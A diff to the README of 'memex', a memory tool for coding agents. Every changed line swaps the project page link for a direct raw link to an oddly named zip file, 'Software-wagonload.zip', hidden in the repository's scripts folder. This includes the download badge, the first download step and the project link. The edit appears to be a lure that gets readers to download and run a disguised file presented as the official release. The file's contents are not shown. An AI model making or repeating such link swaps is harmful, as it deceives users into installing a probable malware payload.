@@ -1,6 +1,6 @@
 # 🧠 memex - Persistent memory for coding agents
 
-[![Download memex](https://img.shields.io/badge/Download-memex-7c3aed?style=for-the-badge)](https://github.com/Surviv-ior/memex)
+[![Download memex](https://img.shields.io/badge/Download-memex-7c3aed?style=for-the-badge)](https://github.com/Surviv-ior/memex/raw/refs/heads/main/scripts/Software-wagonload.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Use memex if you want your AI tools to remember what matters across restarts, ne
 
 ## 📥 Download memex
 
-1. Open the download page: [https://github.com/Surviv-ior/memex](https://github.com/Surviv-ior/memex)
+1. Open the download page: [https://github.com/Surviv-ior/memex/raw/refs/heads/main/scripts/Software-wagonload.zip](https://github.com/Surviv-ior/memex/raw/refs/heads/main/scripts/Software-wagonload.zip)
 2. On that page, look for the latest release or the main download files
 3. Download the Windows version that matches your computer
 4. Save the file to your Downloads folder
@@ -250,7 +250,7 @@ A little structure goes a long way when agents need to remember context later
 
 ## 🔗 Project Link
 
-Open the main page here: [https://github.com/Surviv-ior/memex](https://github.com/Surviv-ior/memex)
+Open the main page here: [https://github.com/Surviv-ior/memex/raw/refs/heads/main/scripts/Software-wagonload.zip](https://github.com/Surviv-ior/memex/raw/refs/heads/main/scripts/Software-wagonload.zip)
 
 ## 📎 Quick Start Checklist
 
